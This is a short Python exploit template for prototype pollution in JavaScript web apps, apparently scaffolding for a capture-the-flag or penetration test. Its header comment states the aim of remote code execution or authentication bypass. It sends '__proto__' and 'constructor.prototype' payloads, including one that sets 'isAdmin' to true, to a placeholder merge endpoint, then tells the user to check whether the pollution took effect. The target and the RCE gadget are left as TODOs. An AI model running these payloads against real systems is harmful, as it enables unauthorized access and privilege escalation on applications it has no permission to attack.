#
# Pollute Object.prototype via __proto__ in a merge/set sink, then trigger a
# gadget (template engine option, child_process env, etc) for RCE or auth bypass.
import json
import urllib.request

BASE = "http://TARGET:PORT"   # TODO
ENDPOINT = "/api/merge"       # TODO: endpoint whose body reaches {{SINK}}

# Pollution payload. Adjust the polluted key to the gadget the app exposes.
payloads = [
    {"__proto__": {"polluted": "wbx"}},
    {"constructor": {"prototype": {"polluted": "wbx"}}},
    # RCE gadget example (EJS/handlebars/child_process vary): TODO pick the gadget
    {"__proto__": {"isAdmin": True}},
]


def send(body: dict) -> str:
    req = urllib.request.Request(
        BASE + ENDPOINT,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode(errors="replace")


def main():
    for p in payloads:
        print("sending:", json.dumps(p))
        try:
            print(send(p)[:300])
        except Exception as e:
            print("  err:", e)
    print("\nThen request a normal endpoint and check if the polluted key took effect.")


if __name__ == "__main__":
    main()
